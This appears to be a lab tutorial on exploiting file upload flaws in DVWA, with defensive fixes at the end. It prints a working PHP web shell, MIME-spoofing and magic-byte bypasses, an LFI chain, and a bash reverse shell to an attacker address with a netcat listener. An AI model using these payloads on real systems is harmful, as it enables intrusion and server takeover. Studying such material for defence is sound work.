Introduction

What is a File Upload Vulnerability?

A File Upload Vulnerability occurs when a web server allows users to upload files without properly validating their type, content, or destination. If an attacker uploads a PHP script and the server executes it, they gain Remote Code Execution (RCE) — complete control of the server.

  • 1Web Shell — A malicious PHP/ASP script uploaded to serve as a backdoor. Executes OS commands via URL parameters.
  • 2RCE — Remote Code Execution. The attacker's code runs on the server's OS.
  • 3Upload Directory — Where uploaded files are stored. If inside the webroot, files are URL-accessible and executable.

File Upload Basics

MIME types, magic bytes, and extensions explained

  • MIMEmultipart/form-data — HTTP Content-Type used for file uploads. Each part has its own Content-Type (e.g. image/jpeg). Servers may blindly trust this header.
  • EXTFile Extensions — Suffix after the last dot. Weak servers only check the extension string, not actual file content.
  • MAGICMagic Bytes — First bytes of a file identify its format. GIF: GIF89a | JPEG: FF D8 FF | PNG: 89 50 4E 47. Strict servers inspect these.
  • PHPPHP Execution — Apache passes files with .php (or .phtml, .php5, .phar) to the PHP interpreter. If the file is inside the webroot, visiting its URL executes it.

DVWA Low — No Filtering

Direct PHP shell upload

Step 1 — Create Web Shell (shell.php)

<?php if(isset($_REQUEST['cmd'])){ echo "<pre>".shell_exec($_REQUEST['cmd'])."</pre>"; } ?>

shell_exec() runs the OS command. $_REQUEST['cmd'] reads the URL ?cmd= parameter. No authentication — anyone with the URL can run commands.

Step 2 — Upload & Execute

DVWA → File Upload → Choose shell.php → Upload. Then visit:

http://192.168.56.102/dvwa/hackable/uploads/shell.php?cmd=whoami http://192.168.56.102/dvwa/hackable/uploads/shell.php?cmd=id http://192.168.56.102/dvwa/hackable/uploads/shell.php?cmd=cat+/etc/passwd http://192.168.56.102/dvwa/hackable/uploads/shell.php?cmd=ls+-la

Why it works: No upload validation exists. The server saves any file in the webroot uploads directory. Apache sees .php and executes it through the PHP interpreter.

DVWA Medium — MIME Spoofing

Bypass Content-Type header check

Medium checks: $_FILES['uploaded']['type'] == "image/jpeg" — but this header comes from the browser/client, which the attacker controls.

Bypass 1 — curl MIME Spoof

kali@attacker:~$ curl -v \ -b "security=medium; PHPSESSID=YOUR_SESSION_ID" \ -F "uploaded=@shell.php;type=image/jpeg" \ -F "Upload=Upload" \ http://192.168.56.102/dvwa/vulnerabilities/upload/ # ;type=image/jpeg → sets the Content-Type to image/jpeg in the multipart part # Server trusts this header and accepts shell.php

Bypass 2 — Burp Suite Intercept

  • 1Set Burp proxy: browser → 127.0.0.1:8080
  • 2Upload any real .jpg via DVWA with Intercept ON
  • 3In Burp: change filename to shell.php, replace body with PHP shell code
  • 4Ensure the part's Content-Type remains image/jpeg → Forward

DVWA High — Magic Byte Bypass

GIF89a header trick + LFI chain

High uses getimagesize() which reads actual file bytes — and extension must end in .jpg/.png. Bypass: prepend GIF magic bytes, then include via LFI.

Create GIF89a PHP Polyglot

kali@attacker:~$ printf 'GIF89a<?php system($_GET["cmd"]); ?>' > evil.gif # GIF89a = 6-byte GIF magic number → getimagesize() sees a valid GIF # PHP code follows → LFI execution runs it as PHP

Execute via LFI

http://192.168.56.102/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/evil.gif&cmd=id

The File Inclusion page includes the gif, PHP interprets the embedded code, and the command executes.

Reverse Shell Payload

kali@attacker:~$ printf 'GIF89a<?php system("bash -c \"bash -i >& /dev/tcp/192.168.56.101/4444 0>&1\""); ?>' > evil.gif kali@attacker:~$ nc -lvkp 4444 # Start listener first, then trigger via LFI URL above

Advanced Challenges

Double extension, .htaccess, null byte, LFI chain

Double Extension

shell.php.jpg

Server checks last extension (.jpg) — passes. Apache processes left-to-right and may still execute .php. Works when AllowOverride is enabled.

.htaccess Upload (AllowOverride All)

Upload a file literally named .htaccess with:

AddType application/x-httpd-php .jpg

Now all .jpg files in that directory execute as PHP. Upload shell.jpg → execute as PHP.

Null Byte Injection (PHP < 5.3.4)

shell.php%00.jpg

%00 terminates the string in C functions — PHP reads "shell.php" and ignores ".jpg".

LFI + Upload Chain

  • 1Upload evil.gif (GIF89a + PHP payload)
  • 2Note path: hackable/uploads/evil.gif
  • 3DVWA File Inclusion: ?page=../../hackable/uploads/evil.gif&cmd=id

Defensive Fixes

Secure file upload implementation

1. Whitelist Extensions (PHP)

$allowed = ['jpg','jpeg','png','gif']; $ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION)); if (!in_array($ext, $allowed)) { die("File type not allowed"); }

2. Validate MIME with finfo (not browser header)

$finfo = finfo_open(FILEINFO_MIME_TYPE); $mime = finfo_file($finfo, $_FILES['file']['tmp_name']); $ok = ['image/jpeg','image/png','image/gif']; if (!in_array($mime, $ok)) { die("Invalid MIME type"); }

3. Rename Randomly + Store Outside Webroot

$name = bin2hex(random_bytes(16)) . '.jpg'; move_uploaded_file($tmp, '/var/uploads/' . $name); // /var/uploads/ is not served by Apache — no URL execution

4. Disable PHP in Upload Directory (.htaccess)

php_flag engine off # Place this .htaccess in the uploads/ folder # Apache refuses to execute PHP files even if uploaded

Conclusion

File Upload Vulnerabilities exist because developers trust client-supplied metadata (filename, MIME type) without verifying actual file content. The path to RCE is short: upload a PHP file, find its URL, visit it.

The secure pattern is defense-in-depth: whitelist extensions and validate magic bytes and rename files and store outside webroot and disable execution. No single control is sufficient alone.
